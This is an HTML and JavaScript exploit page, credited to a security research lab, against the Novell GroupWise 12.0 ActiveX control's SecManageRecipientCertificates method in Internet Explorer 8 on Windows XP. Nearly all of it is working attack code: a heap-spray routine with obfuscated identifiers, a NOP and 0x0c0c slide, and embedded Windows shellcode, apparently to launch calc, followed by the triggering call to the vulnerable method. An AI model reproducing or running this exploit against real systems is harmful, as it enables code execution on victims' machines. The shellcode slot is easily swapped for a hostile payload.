&lt;!--  (c)oded by High-Tech Bridge Security Research Lab  --&gt;
&lt;!-- Windows XP-SP3 Internet Explorer 8.0 - Dep Disabled --&gt;
&lt;html&gt;
&lt;Title&gt;- Novell GroupWise 12.0 SecManageRecipientCertificates method Exploit -&lt;/Title&gt;
&lt;object id=ctrl classid='clsid:{BFEC5A01-1EB1-11D1-BC96-00805FC1C85A}'&gt;&lt;/object&gt;
&lt;script language='javascript'&gt;

function GyGguPonxZoADbtgXPS() {
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);
    this.KJZFzfumaV = &quot;AAAA&quot;;

    while (4 + this.KJZFzfumaV.length*2 + 2 &lt; this.maxAlloc) {
        this.KJZFzfumaV += this.KJZFzfumaV;
    }
    this.mem = new Array();
    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.mNhbOXqosTNKjGhfj = function(msg) {
    void(Math.atan2(0xbabe, msg));
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.YMQLSZf = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.ooWKILTrZUXKEMl = function(msg) {
    void(Math.acos(0xbabe));
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.zoNWUcOOYegFinTDSbOSAAM = function(len) {
    if (len &gt; this.KJZFzfumaV.length)
        throw &quot;Requested zoNWUcOOYegFinTDSbOSAAM string length &quot; + len + &quot;, only &quot; + this.KJZFzfumaV.length + &quot; available&quot;;

    return this.KJZFzfumaV.substr(0, len);
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.UWzqrDQwReXOllGssMYEzruQtomLp = function(num, UWzqrDQwReXOllGssMYEzruQtomLp) {
    if (UWzqrDQwReXOllGssMYEzruQtomLp == 0)
        throw &quot;Round argument cannot be 0&quot;;

    return parseInt((num + (UWzqrDQwReXOllGssMYEzruQtomLp-1)) / UWzqrDQwReXOllGssMYEzruQtomLp) * UWzqrDQwReXOllGssMYEzruQtomLp;
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.beTBwoiJGBBhwyZg = function(num, width)
{
    var digits = &quot;0123456789ABCDEF&quot;;

    var beTBwoiJGBBhwyZg = digits.substr(num &amp; 0xF, 1);

    while (num &gt; 0xF) {
        num = num &gt;&gt;&gt; 4;
        beTBwoiJGBBhwyZg = digits.substr(num &amp; 0xF, 1) + beTBwoiJGBBhwyZg;
    }

    var width = (width ? width : 0);

    while (beTBwoiJGBBhwyZg.length &lt; width)
        beTBwoiJGBBhwyZg = &quot;0&quot; + beTBwoiJGBBhwyZg;

    return beTBwoiJGBBhwyZg;
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.RBRfbU = function(RBRfbU) {
    return unescape(&quot;%u&quot; + this.beTBwoiJGBBhwyZg(RBRfbU &amp; 0xFFFF, 4) + &quot;%u&quot; + this.beTBwoiJGBBhwyZg((RBRfbU &gt;&gt; 16) &amp; 0xFFFF, 4));
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.nPdkLCpaz = function(arg, tag) {

    var size;
    if (typeof arg == &quot;string&quot; || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size &amp; 0xf) != 0)
        throw &quot;Allocation size &quot; + size + &quot; must be a multiple of 16&quot;;
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == &quot;string&quot; || arg instanceof String) {
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        this.mem[tag].push(this.zoNWUcOOYegFinTDSbOSAAM((arg-6)/2));
    }
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.SWc = function(tag) {

    delete this.mem[tag];
    CollectGarbage();
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.AocZkxOTvEXwFTsIPMSanrManzYrte = function() {

    this.mNhbOXqosTNKjGhfj(&quot;Flushing the OLEAUT32 cache&quot;);

    this.SWc(&quot;oleaut32&quot;);

    for (var i = 0; i &lt; 6; i++) {
        this.nPdkLCpaz(32, &quot;oleaut32&quot;);
        this.nPdkLCpaz(64, &quot;oleaut32&quot;);
        this.nPdkLCpaz(256, &quot;oleaut32&quot;);
        this.nPdkLCpaz(32768, &quot;oleaut32&quot;);
    }
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.uYiBaSLpjlOJJdhFAb = function(arg, tag) {

    var size;
    if (typeof arg == &quot;string&quot; || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw &quot;Allocation sizes &quot; + size + &quot; cannot be flushed out of the OLEAUT32 cache&quot;;
    this.nPdkLCpaz(arg, tag);
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.K = function(tag) {
    this.SWc(tag);
    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.WbTbmzXVnhA = function() {

    this.mNhbOXqosTNKjGhfj(&quot;Running the garbage collector&quot;);
    CollectGarbage();

    this.AocZkxOTvEXwFTsIPMSanrManzYrte();
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.ZsJjplNR = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i &lt; count; i++) {
        this.uYiBaSLpjlOJJdhFAb(arg);
        this.uYiBaSLpjlOJJdhFAb(arg, &quot;ZsJjplNR&quot;);
    }
    this.uYiBaSLpjlOJJdhFAb(arg);

    this.K(&quot;ZsJjplNR&quot;);
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.WbjLbPsZ = function(arg, count) {

    var size;
    if (typeof arg == &quot;string&quot; || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size &amp; 0xf) != 0)
        throw &quot;Allocation size &quot; + size + &quot; must be a multiple of 16&quot;;

    if (size+8 &gt;= 1024)
        throw(&quot;Maximum WbjLbPsZ block size is 1008 bytes&quot;);

    var count = (count ? count : 1);

    for (var i = 0; i &lt; count; i++)
        this.uYiBaSLpjlOJJdhFAb(arg, &quot;WbjLbPsZ&quot;);

    this.K(&quot;WbjLbPsZ&quot;);
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.foURAtIhCeelDtsbOQrWNdbMLDvFP = function(arg)
{
    var size;
    if (typeof arg == &quot;string&quot; || arg instanceof String)
        size = 4 + arg.length*2 + 2;
    else
        size = arg;
    if ((size &amp; 0xf) != 0)
        throw &quot;Allocation size &quot; + size + &quot; must be a multiple of 16&quot;;

    if (size+8 &gt;= 1024)
        throw(&quot;Maximum WbjLbPsZ block size is 1008 bytes&quot;);

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}

GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl.prototype.udIUhjCc = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);
    if ((size &amp; 0xf) != 0)
        throw &quot;Vtable size &quot; + size + &quot; must be a multiple of 16&quot;;

    if (shellcode.length*2 &gt; size-138)
        throw(&quot;Maximum shellcode length is &quot; + (size-138) + &quot; bytes&quot;);

    var udIUhjCc = unescape(&quot;%u9090%u7ceb&quot;)

    for (var i = 0; i &lt; 124/4; i++)
        udIUhjCc += this.RBRfbU(jmpecx);

    udIUhjCc += unescape(&quot;%u0028%u0028&quot;) +
              shellcode + heap.zoNWUcOOYegFinTDSbOSAAM((size-138)/2 - shellcode.length);

    return udIUhjCc;
}
    var heap_obj = new GyGguPonxZoADbtgXPS.fCIgzuiPwtTRcuxDXwnvOKNl(0x10000);
    var pop_calc = unescape(
                 &quot;%u0c0c%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac&quot; +
                 &quot;%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18&quot; +
                 &quot;%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58&quot; +
                 &quot;%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12&quot; +
                 &quot;%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80&quot; +
                 &quot;%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063&quot; +
                 &quot;&quot;);

    var or_slide = unescape(&quot;%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c&quot;);
    var zoNWUcOOYegFinTDSbOSAAM = unescape(&quot;%u9090%u9090&quot;);

    while (zoNWUcOOYegFinTDSbOSAAM.length &lt; 0x1000) zoNWUcOOYegFinTDSbOSAAM += zoNWUcOOYegFinTDSbOSAAM;

    offset_length = 0x5F6;
    junk_offset = zoNWUcOOYegFinTDSbOSAAM.substring(0, offset_length);

    var shellcode = junk_offset + or_slide + pop_calc + zoNWUcOOYegFinTDSbOSAAM.substring(0, 0x800 - pop_calc.length - junk_offset.length - or_slide.length);
    while (shellcode.length &lt; 0x40000) shellcode += shellcode;

    var block = shellcode.substring(2, 0x40000 - 0x21);
    for (var i=0; i &lt; 250; i++) {
     heap_obj.uYiBaSLpjlOJJdhFAb(block);
    }
     ctrl.SecManageRecipientCertificates(202116108)
&lt;/script&gt;
&lt;/html&gt;
